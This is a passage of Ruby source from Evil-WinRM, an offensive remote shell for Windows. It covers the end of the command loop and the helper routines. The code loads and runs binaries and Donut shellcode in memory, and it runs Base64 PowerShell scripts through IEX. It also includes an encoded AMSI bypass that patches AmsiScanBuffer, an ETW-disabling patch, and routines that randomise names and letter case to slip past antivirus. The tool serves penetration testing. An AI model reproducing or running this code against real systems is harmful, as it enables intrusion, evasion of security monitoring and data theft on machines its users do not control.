                    progress_bar(bytes_copied, total_bytes)
                    if bytes_copied == total_bytes
                      print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA, true, $logger)
                    end
                  end
                  print_message('Upload successful!', TYPE_INFO, true, $logger)
                end
              rescue StandardError => e
                $logger.info("#{e}: #{e.backtrace}") unless $logger.nil?
                print_message('Upload failed. Check filenames or paths: ' + e.to_s, TYPE_ERROR, true, $logger)
              ensure
                command = ''
              end
            elsif command.start_with?('download')
              if docker_detection
                print_message('Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command', TYPE_WARNING, true, $logger)
              end
              begin
                dest = ""
                source = ""
                paths = get_paths_from_command(command, pwd)

                if paths.length == 2
                  dest = paths.pop
                  source = paths.pop
                else
                  source = paths.pop
                  dest = ""
                end

                if source.match(/^\.[\\\/]/)
                  source = source.gsub(/^\./, "")
                end
                unless source.match(/^[a-zA-Z]:[\\\/]/) then
                  source = pwd  + '\\' + source.gsub(/^[\\\/]/, '')
                end

                source_expr_i = source.index(/(\*\.|\*\*|\.\*|\*)/) || -1
                if dest.empty?
                  if source_expr_i == -1
                    dest = "#{extract_filename(source)}"
                  else
                    index_last_folder = source.rindex(/[\\\/]/, source_expr_i)
                    dest = "#{extract_filename(source[0..index_last_folder])}"
                  end
                end

                if dest.match?(/^(\.[\\\/]|\.)$/)
                  dest = "#{extract_filename(source)}"
                end

                if extract_filename(source).empty?
                  print_message("A filename or folder must be specified!", TYPE_ERROR, true, $logger)
                else
                  size = filesize(shell, source)
                  source = source.gsub("/", "\\") if Gem.win_platform?
                  dest = dest.gsub("\\", "/") unless Gem.win_platform?
                  print_message("Downloading #{source} to #{dest}", TYPE_INFO, true, $logger)
                  downloaded = file_manager.download(source, dest, size: size) do |index, size|
                    progress_bar(index, size)
                  end
                  if downloaded != false
                    print_message('Download successful!', TYPE_INFO, true, $logger)
                  else
                    print_message('Download failed. Check filenames or paths', TYPE_ERROR, true, $logger)
                  end
                end
              rescue StandardError => e
                print_message('Download failed. Check filenames or paths: ' + e.to_s, TYPE_ERROR, true, $logger)
              ensure
                command = ''
              end
            elsif command.start_with?('Invoke-Binary')
              begin
                invoke_Binary = command.tokenize
                command = ''
                if !invoke_Binary[1].to_s.empty?
                  load_executable = invoke_Binary[1]
                  load_executable = File.binread(load_executable)
                  load_executable = Base64.strict_encode64(load_executable)
                  if !invoke_Binary[2].to_s.empty?
                    output = shell.run("Invoke-Binary #{load_executable} ,#{invoke_Binary[2]}")
                    puts(output.output)
                  elsif invoke_Binary[2].to_s.empty?
                    output = shell.run("Invoke-Binary #{load_executable}")
                    puts(output.output)
                  end
                elsif (output = shell.run('Invoke-Binary'))
                  puts(output.output)
                end
              rescue StandardError => e
                print_message('Check filenames', TYPE_ERROR, true, $logger)
              end
            elsif command.start_with?('Donut-Loader')
              begin
                donut_Loader = command.tokenize
                command = ''
                unless donut_Loader[4].to_s.empty? then
                    pid = donut_Loader[2]
                    load_executable = donut_Loader[4]
                    load_executable = File.binread(load_executable)
                    load_executable = Base64.strict_encode64(load_executable)
                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
                else
                    output = shell.run("Donut-Loader")
                end
                print(output.output)
                $logger&.info(output.output)
              rescue StandardError
                print_message('Check filenames', TYPE_ERROR, true, $logger)
              end
            elsif command.start_with?('services')
              command = ''
              output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
              print(output.output.chomp)
              $logger&.info(output.output.chomp)
            elsif command.start_with?(*@functions)
              silent_warnings do
                load_script = $scripts_path + command
                command = ''
                load_script = load_script.gsub(' ', '')
                load_script = File.binread(load_script)
                load_script = Base64.strict_encode64(load_script)
                script_split = load_script.scan(/.{1,5000}/)
                script_split.each do |item|
                  output = shell.run("$a += '#{item}'")
                end

                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
                output = shell.run('$a = $null')
              end
            elsif command.start_with?('menu')
              command = ''
              silent_warnings do
                if @Bypass_4MSI_loaded
                  unless @psLoaded
                      print_message("Bypass-4MSI is loaded. Trying to load utilities", TYPE_INFO, true, $logger)
                      shell.run(donuts)
                      shell.run(invokeBin)
                      shell.run(dllloader)
                      @psLoaded = true
                  end
                end
                outputs = load_powershell(shell, menu, 2)
                puts(get_banner)
                puts
                output = shell.run($MENU_CMD)
                autocomplete = output.output || ""
                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                autocomplete = autocomplete || ""
                assemblyautocomplete = shell.run($SHOW_GLOBAL_METHODS_CMD).output.chomp
                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                unless assemblyautocomplete.to_s.empty?
                  $LISTASSEMNOW = assemblyautocomplete.split("\n")
                  $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                end
                $LIST2 = autocomplete.split("\n")
                $LIST = $LIST + $LIST2
                $COMMANDS = $COMMANDS + $LIST2
                $COMMANDS = $COMMANDS.uniq
                cmdlets = ""
                if !$LIST2.nil? && !$LIST2.empty?
                  cmdlets = '[+] ' + $LIST2.join("\n").gsub(/\n/,"\n[+] ") + "\n"
                end
                message_output = cmdlets  + '[+] ' + $CMDS.join("\n").gsub(/\n/,"\n[+] ") + "\n\n"
                puts(message_output)
                $logger&.info(message_output)
              end
            elsif command == 'Bypass-4MSI'
              command = ''
              timeToWait = (time + 20) - Time.now.to_i
              if timeToWait.positive?
                print_message('AV could be still watching for suspicious activity. Waiting for patching...', TYPE_WARNING, true, $logger)
                sleep(timeToWait)
              end
              unless @Bypass_4MSI_loaded
                load_Bypass_4MSI(shell)
                load_ETW_patch(shell)
                @Bypass_4MSI_loaded = true
              end
            end

            output = shell.run(command) do |stdout, stderr|
              stdout&.each_line do |line|
                $stdout.puts(line.rstrip)
              end
              $stderr.print(stderr)
            end

            next unless !$logger.nil? && !command.empty?
            output_logger = ''
            output.output.each_line do |line|
              output_logger += "#{line.rstrip!}\n"
            end
            $logger.info(output_logger)
          end
        rescue Errno::EACCES => e
          puts
          print_message("An error of type #{e.class} happened, message is #{e.message}", TYPE_ERROR, true, $logger)
          retry
        rescue Interrupt
          puts
          print_message('Press "y" to exit, press any other key to continue', TYPE_WARNING, true, $logger)
          if $stdin.getch.downcase == 'y'
            custom_exit(130)
          else
            retry
          end
        end

        custom_exit(0)
      end
    rescue SystemExit
    rescue SocketError
      print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true, $logger)
      custom_exit(1)
    rescue Exception => e
      print_message("An error of type #{e.class} happened, message is #{e.message}", TYPE_ERROR, true, $logger)
      custom_exit(1)
    end
  end

  def get_banner
    Base64.decode64('DQoNCiAgICwuICAgKCAgIC4gICAgICApICAgICAgICAgICAgICAgIiAgICAgICAgICAgICwuICAgKCAgIC4gICAgICApICAgICAgIC4gICANCiAgKCIgICggICkgICknICAgICAsJyAgICAgICAgICAgICAoYCAgICAgJ2AgICAgKCIgICAgICkgICknICAgICAsJyAgIC4gICwpICANCi47ICkgICcgKCggKCIgKSAgICA7KCwgICAgICAuICAgICA7KSAgIiAgKSIgIC47ICkgICcgKCggKCIgKSAgICk7KCwgICApKCggICANCl8iLixfLC5fXykuLCkgKC4uXyggLl8pLCAgICAgKSAgLCAoLl8uLiggJy4uXyIuXywgLiAnLl8pXyguLixfKF8iLikgXyggXycpICANClxfICAgX19fX18vX18gIF98X198ICB8ICAgICgoICAoICAvICBcICAgIC8gIFxfX3wgX19fX1xfX19fX18gICBcICAvICAgICBcICANCiB8ICAgIF9fKV9cICBcLyAvICB8ICB8ICAgIDtfKV8nKSBcICAgXC9cLyAgIC8gIHwvICAgIFx8ICAgICAgIF8vIC8gIFwgLyAgXCANCiB8ICAgICAgICBcXCAgIC98ICB8ICB8X18gL19fX19fLyAgXCAgICAgICAgL3wgIHwgICB8ICBcICAgIHwgICBcLyAgICBZICAgIFwNCi9fX19fX19fICAvIFxfLyB8X198X19fXy8gICAgICAgICAgIFxfXy9cICAvIHxfX3xfX198ICAvX19fX3xfICAvXF9fX198X18gIC8NCiAgICAgICAgXC8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICAgXC8gICAgICAgXC8gICAgICAgICBcLw0KDQogICAgICAgQnk6IEN5YmVyVmFjYSwgT3NjYXJBa2FFbHZpcywgSmFyaWxhb3MsIEFyYWxlNjEgQEhhY2twbGF5ZXJzDQo=')
  end

  def random_string(len = 3)
    Array.new(len) { [*'0'..'9', *'A'..'Z', *'a'..'z'].sample }.join
  end

  def random_case(word)
    word.chars.map { |c| (rand 2).zero? ? c : c.upcase }.join
  end

  def get_char_expresion(the_char)
    rand_val = rand(10_000) + rand(100)
    val = the_char.ord + rand_val
    char_val = random_case('char')

    "[#{char_val}](#{val}-#{rand_val})"
  end

  def get_byte_expresion(the_char)
    rand_val = rand(30..120)
    val = the_char.ord + rand_val
    char_val = random_case('char')
    byte_val = random_case('byte')

    "[#{char_val}]([#{byte_val}] 0x#{val.to_s(16)}-0x#{rand_val.to_s(16)})"
  end

  def get_char_raw(the_char)
    "\"#{the_char}\""
  end

  def generate_random_type_string(to_randomize)
    result = ''
    to_randomize.chars.each { |c| result += "+#{(rand 2) == 0 ? (rand 2) == 0 ? self.get_char_expresion(c): self.get_byte_expresion(c) : self.get_char_expresion(c)}"}
    result[1..-1]
  end

  def replace_placeholder(template, placeholder, str_value)
    result = template.gsub(placeholder, str_value)
    result
  end

  def replace_placeholder_string(template, placeholder, str_value)
    result = replace_placeholder(template, placeholder, generate_random_type_string(str_value))
    result
  end

  def replace_placeholder_var(template, var_placeholder)
    var_name = random_string((5..21).to_a.sample)
    result = replace_placeholder(template, var_placeholder, var_name)
    result
  end

  def replace_func_var_name(template, function_name, replace_with)
    if replace_with.length == 0
      replace_with = random_string((15..32).to_a.sample)
    end
    a_mark = ">><"
    func_placeholder = "#{a_mark}#{function_name}#{a_mark}"
    result = replace_placeholder(template, func_placeholder, replace_with)
    result
  end

  def replace_string_scan_part(template, begin_i, end_i, mark)
    to_replace = template[begin_i..end_i]
    to_place = to_replace.gsub(mark, "")
    first_t = false
    result = ""
    to_place.split("|").each do |word|
      if ! first_t
        first_t = true
        result += generate_random_type_string(word)
      else
        result += "+\"|\"+" + generate_random_type_string(word)
      end

    end
    template.gsub!(to_replace, result)
  end

  def replace_with_string_scan(template)
    result = template
    a_mark = "<><"
    begin_i = template.index(a_mark)
    last_i = 0
    if !begin_i.nil? && begin_i >= 0
      next_i = template.index(a_mark, begin_i + 1)
      while !next_i.nil? && !begin_i.nil? && next_i > begin_i && next_i + 2 <= template.length
        next_i += 2
        last_i = next_i
        replace_string_scan_part(result, begin_i, next_i, a_mark)
        begin_i =  template.index(a_mark, next_i)
        if !begin_i.nil? && begin_i >= 0
          next_i = template.index(a_mark, begin_i + 1)
        else
          next_i = -1
        end
      end
    end
    result
  end

  def rand_casing_keywords(template)
    $WORDS_RANDOM_CASE.each { |w| template.gsub!(w.to_s, random_case(w)) }
    template
  end

  def get_menu
    menu_template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04yPj48IHsKICAgIGxzIGZ1bmN0aW9uOiB8IFdoZXJlLU9iamVjdCB7CiAgICAgICAgJF8ubmFtZSAtbm90bWF0Y2ggIl4oP2kpIisiKD4+PEZVTkNUSU9ONT4+PHxDb252ZXJ0RnJvbS1TZGRsU3RyaW5nfEdldC1WZXJifEltcG9ydFN5c3RlbU1vZHVsZXN8aGVscHxjZHxvc3MpIiAtYW5kCiAgICAgICAgKCRfLm5hbWUpLkxlbmd0aCAtZ2UgIjQiCiAgICB9Cn0KCmZ1bmN0aW9uID4+PEZVTkNUSU9OND4+PCB7CiAgICA+PjxGVU5DVElPTjI+PjwgfCBXaGVyZS1PYmplY3QgewogICAgICAgICRfLm5hbWUgLW5vdG1hdGNoICJeKD9pKSIrIihDbGVhci1Ib3N0fEZvcm1hdC1IZXh8R2V0LUZpbGVIYXNofG1rZGlyfFRhYkV4cGFuc2lvbjJ8Pj48RlVOQ1RJT04xPj48KSIKICAgIH0KfQoKZnVuY3Rpb24gPj48RlVOQ1RJT04zPj48IHsKICAgID4+PEZVTkNUSU9OND4+PCB8IFdoZXJlLU9iamVjdCB7IAogICAgICAgICRfLm5hbWUgLW5vdG1hdGNoICJeKD9pKSIrIihtb3JlfE5ldy1HdWlkfE5ldy1UZW1wb3JhcnlGaWxlfD4+PEZVTkNUSU9OMj4+PHw+PjxGVU5DVElPTjM+PjwpIgogICAgfQp9CgpmdW5jdGlvbiA+PjxGVU5DVElPTjU+PjwgewogICAgPj48RlVOQ1RJT04zPj48IHwgV2hlcmUtT2JqZWN0IHsgCiAgICAgICAgJF8ubmFtZSAtbm90bWF0Y2ggIl4oP2kpIisiKD4+PEZVTkNUSU9ONj4+PHxJbXBvcnQtUG93ZXJTaGVsbERhdGFGaWxlfE1haW58UGF1c2V8cHJvbXB0fD4+PEZVTkNUSU9OND4+PCkiCiAgICB9Cn0KCmZ1bmN0aW9uID4+PEZVTkNUSU9ONj4+PCB7CiAgICA+PjxGVU5DVElPTjU+PjwgfCBTZWxlY3QtT2JqZWN0IC1Qcm9wZXJ0eSBOYW1lIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICIkKCRfLk5hbWUpIgogICAgfQp9CgpmdW5jdGlvbiA+PjxGVU5DVElPTjE+PjwgewoKICAgICRnbG9iYWw6c2hvd21ldGhvZHMKfQo='
    result = Base64.decode64(menu_template)
    show_methods_loaded = "Get-#{random_string((5..15).to_a.sample)}"
    menu_function_name = "Get-#{random_string((4..17).to_a.sample)}"
    random_func1 = "Get-#{random_string((7..17).to_a.sample)}"
    random_func2 = "Get-#{random_string((7..17).to_a.sample)}"
    random_func3 = "Get-#{random_string((7..17).to_a.sample)}"
    random_func4 = "Get-#{random_string((7..17).to_a.sample)}"
    result = replace_func_var_name(result, "FUNCTION1", show_methods_loaded)
    result = replace_func_var_name(result, "FUNCTION2", random_func1)
    result = replace_func_var_name(result, "FUNCTION3", random_func2)
    result = replace_func_var_name(result, "FUNCTION4", random_func3)
    result = replace_func_var_name(result, "FUNCTION5", random_func4)
    result = replace_func_var_name(result, "FUNCTION6", menu_function_name)
    result = replace_with_string_scan(result)
    result = rand_casing_keywords(result)
    $SHOW_GLOBAL_METHODS_CMD = show_methods_loaded
    $MENU_CMD = menu_function_name
    result
  end

  def get_Bypass_4MSI
    bypass_template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04xPj48IHsKICAgIFBhcmFtICg+PjxWQVIxPj48LCA+PjxWQVIyPj48KQogICAgPj48VkFSMz4+PCA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgV2hlcmUtT2JqZWN0IHsgCiAgICAgICAgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCIiKzw+PFw8PjwrIiIpWy0xXS5FcXVhbHMoIiIrPD48U3lzdGVtLmRsbDw+PCsiIikKICAgICB9KS5HZXRUeXBlKCJNaWNyb3NvZnQuIis8PjxXaW4zMi5Vbjw+PCsic2FmZU5hdGl2ZU1ldGhvZHMiKQogICAgPj48VkFSND4+PD1AKCkKICAgID4+PFZBUjM+PjwuR2V0TWV0aG9kcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIElmKCRfLk5hbWUgLWxpa2UgIkdlKlAqb2MqIis8PjxkZHJlczw+PCsicyIpIHsKICAgICAgICAgICAgPj48VkFSND4+PCs9JF8KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gPj48VkFSND4+PFswXS5JbnZva2UoJG51bGwsIEAoKD4+PFZBUjM+PjwuR2V0TWV0aG9kKCIiKzw+PEdldE08PjwrIm9kdWwiKzw+PGVIYW48PjwrImRsZSIpKS5JbnZva2UoJG51bGwsIEAoPj48VkFSMT4+PCkpLCA+PjxWQVIyPj48KSkKfQojanVtcAoKZnVuY3Rpb24gPj48RlVOQ1RJT04yPj48IHsKICAgIFBhcmFtICgKICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSA+PjxWQVI1Pj48LCBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSA+PjxWQVI2Pj48ID0gW1ZvaWRdCiAgICApCiAgICA+PjxWQVIxMj4+PCA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgKICAgICAgICAoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoIiIrPD48UmVmPD48KyJsZWMiKzw+PHRlZERlPD48KyJsZWdhdGUiKSksCiAgICAgICAgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuCiAgICApLkRlZmluZUR5bmFtaWNNb2R1bGUoCiAgICAgICAgIiIrPD48SW5NPD48KyJlbW8iKzw+PHJ5PD48KyJNb2R1bGUiLAogICAgICAgICRmYWxzZQogICAgKS5EZWZpbmVUeXBlKAogICAgICAgICQoIiIrPD48TXlEZWxlZ2F0ZVR5cGU8PjwrIiIpLAogICAgICAgICJDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzIiwKICAgICAgICBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXQogICAgKQoKICAgID4+PFZBUjEyPj48LkRlZmluZUNvbnN0cnVjdG9yKAogICAgICAgICJSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYyIsCiAgICAgICAgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCA+PjxWQVI1Pj48CiAgICApLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoIlJ1bnRpbWUsIE1hbmFnZWQiKQoKICAgID4+PFZBUjEyPj48LkRlZmluZU1ldGhvZCgKICAgICAgICAiSW52b2tlIiwKICAgICAgICAiUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwiLAogICAgICAgID4+PFZBUjY+PjwsCiAgICAgICAgPj48VkFSNT4+PAogICAgKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCJSdW50aW1lLCBNYW5hZ2VkIikKICAgIAogICAgcmV0dXJuID4+PFZBUjEyPj48LkNyZWF0ZVR5cGUoKQp9CiNqdW1wCltJbnRQdHJdPj48VkFSNz4+PCA9ID4+PEZVTkNUSU9OMT4+PCAkKCIiKzw+PGFtc2kuZGxsPD48KyIiKSAkKCIiKzw+PEFtc2lTY2FuQnVmZmVyPD48KyIiKQojanVtcAo+PjxWQVI4Pj48ID0gMAojanVtcAo+PjxWQVI5Pj48PVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKAogICAgKD4+PEZVTkNUSU9OMT4+PCAkKCIiKzw+PGtlcm5lbDMyLmRsbDw+PCsiIikgVmlydHVhbFByb3RlY3QpLCAKICAgICg+PjxGVU5DVElPTjI+PjwgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKQopCiNqdW1wCj4+PFZBUjEwPj48ID0gPj48VkFSOT4+PC5JbnZva2UoPj48VkFSNz4+PCwgMywgMHg0MCwgW3JlZl0+PjxWQVI4Pj48KQojanVtcAo+PjxWQVIxMT4+PCA9IFtCeXRlW11dICgweGI4LDB4MzQsMHgxMiwweDA3LDB4ODAsMHg2NiwweGI4LDB4MzIsMHgwMCwweGIwLDB4NTcsMHhjMykKI2p1bXAKPj48VkFSMTA+PjwgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KD4+PFZBUjExPj48LCAwLCA+PjxWQVI3Pj48LCAxMikKI2p1bXAKUmVtb3ZlLUl0ZW0gRnVuY3Rpb246Pj48RlVOQ1RJT04yPj48CiNqdW1wClJlbW92ZS1JdGVtIEZ1bmN0aW9uOj4+PEZVTkNUSU9OMT4+PA=='

    result = Base64.decode64(bypass_template)

    for i in 1..2
      func_name = "Get-#{random_string((7..17).to_a.sample)}"
      result = replace_func_var_name(result, "FUNCTION#{i}", func_name)
    end

    for i in 1..12
      var_name = "$#{random_string((7..17).to_a.sample)}"
      result = replace_func_var_name(result, "VAR#{i}", var_name)
    end

    result = replace_with_string_scan(result)
    result = rand_casing_keywords(result)
    result
  end

  def wait_for(time_to_wait)
    thread = Thread.new do
        sleep(time_to_wait)
    end
    thread.join
  end

  def load_powershell(shell, powershell_script, sleep_for = 2)
    outputs = []
    num_jumps = powershell_script.scan(/#jump/).size + 1
    current_jump = 1
    if num_jumps > 1
      powershell_script.split('#jump').each do |item|
        progress_bar(current_jump, num_jumps)
        output = shell.run(item)
        if !output.output.nil? && !output.output.empty? && !output.output.chomp.empty?
          outputs << output.output
        end
        current_jump += 1
        wait_for(sleep_for)
      end
    else
      output = shell.run(powershell_script).output
      if !output.nil? && !output.empty?
        outputs << output
      end
    end
    outputs
  end

  def load_Bypass_4MSI(shell)
    bypass = get_Bypass_4MSI
    print_message('Patching 4MSI, please be patient...', TYPE_INFO, true)
    outputs = load_powershell(shell, bypass, 2)
    if outputs.empty?
      print_message('[+] Success!', TYPE_SUCCESS, false)
    else
      puts(outputs.join("\n"))
    end
  end

  def load_ETW_patch(shell)
    print_message('Patching ETW, please be patient ..', TYPE_INFO, true)
    patch_template = 'W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCIiKzw+PFN5c3RlbS5Db3JlPD48KyIiKS5HZXRUeXBlKCJTeXMiKzw+PHRlbS5EaWFnPD48KyJub3N0aWNzLkUiKzw+PHZlbnRpbmcuRXZlbnQ8PjwrIlByb3ZpZGVyIikuR2V0RmllbGQoIiIrPD48bV88PjwrImVuYWJsZWQiLCJOb25QdWJsaWMsSW5zdGFuY2UiKS5TZXRWYWx1ZShbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCJTeXMiKzw+PHRlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uVHJhY2luZy5QU0V0dzw+PCsiTG9nIis8PjxQcm92aWRlcjw+PCsiIikuR2V0RmllbGQoIiIrPD48ZXR3UHJvdmlkZXI8PjwrIiIsIk5vblB1YmxpYyxTdGF0aWMiKS5HZXRWYWx1ZSg+PjxWQVIxPj48KSwwKQ=='
    result = Base64.decode64(patch_template)
    result = replace_func_var_name(result, "VAR1", "$#{random_string((7..17).to_a.sample)}")
    result = replace_with_string_scan(result)
    result = rand_casing_keywords(result)
    outputs = load_powershell(shell, result)
    if outputs.empty?
      print_message('[+] Success!', TYPE_SUCCESS, false)
    else
      puts("Error #{outputs.join("\n")}")
    end
  end

  def extract_filename(path)
    path = path || ""
    path = path.gsub("\\", '/')
    path.split('/')[-1]
  end

  def get_paths_from_command(command, pwd)
    parts = Shellwords.shellsplit(command)
    parts.delete_at(0)
    return parts
  end

  def get_from_cache(n_path)
    return if n_path.nil? || n_path.empty?

    a_path = normalize_path(n_path)
    current_time = Time.now.to_i
    current_vals = @directories[a_path]
    result = []
    unless current_vals.nil?
      is_valid = current_vals['time'] > current_time - @cache_ttl
      result = current_vals['files'] if is_valid
      @directories.delete(a_path) unless is_valid
    end

    result
  end

  def set_cache(n_path, paths)
    return if n_path.nil? || n_path.empty?

    a_path = normalize_path(n_path)
    current_time = Time.now.to_i
    @directories[a_path] = { 'time' => current_time, 'files' => paths }
  end

  def normalize_path(str)
    Regexp.escape(str.to_s.gsub('\\', '/'))
  end

  def get_dir_parts(n_path)
    return [n_path, ''] unless (n_path[-1] =~ %r{/$}).nil?

    i_last = n_path.rindex('/')
    return ['./', n_path] if i_last.nil?

    next_i = i_last + 1
    amount = n_path.length - next_i

    [n_path[0, i_last + 1], n_path[next_i, amount]]
  end

  def complete_path(str, shell)
    return unless @completion_enabled
    return unless !str.empty? && !(str =~ %r{^(\./|[a-z,A-Z]:|\.\./|~/|/)*}i).nil?

    n_path = str
    parts = get_dir_parts(n_path)
    dir_p = parts[0]
    nam_p = parts[1]
    result = []
    result = get_from_cache(dir_p) unless dir_p =~ %r{^(\./|\.\./|~|/)}

    if result.nil? || result.empty?
      target_dir = dir_p
      pscmd = "$a=@();$(ls '#{target_dir}*' -ErrorAction SilentlyContinue -Force |Foreach-Object {  if((Get-Item $_.FullName -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo] ){ $a +=  \"$($_.FullName.Replace('\\','/'))/\"}else{  $a += \"$($_.FullName.Replace('\\', '/'))\" } });$a += \"$($(Resolve-Path -Path '#{target_dir}').Path.Replace('\\','/'))\";$a"

      output = shell.run(pscmd).output
      s = output.to_s.gsub(/\r/, '').split(/\n/)

      dir_p = s.pop
      set_cache(dir_p, s)
      result = s
    end
    dir_p += '/' unless dir_p[-1] == '/'
    path_grep = normalize_path(dir_p + nam_p)
    path_grep = path_grep.chop if !path_grep.empty? && path_grep[0] == '"'
    filtered = result.grep(/^#{path_grep}/i)
    filtered.collect { |x| "\"#{x}\"" }
  end
end

# Class to create array (tokenize) from a string
class String
  def tokenize
    split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/)
      .reject(&:empty?)
      .map { |s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/, '') }
  end
end

# Execution
e = EvilWinRM.new
e.main
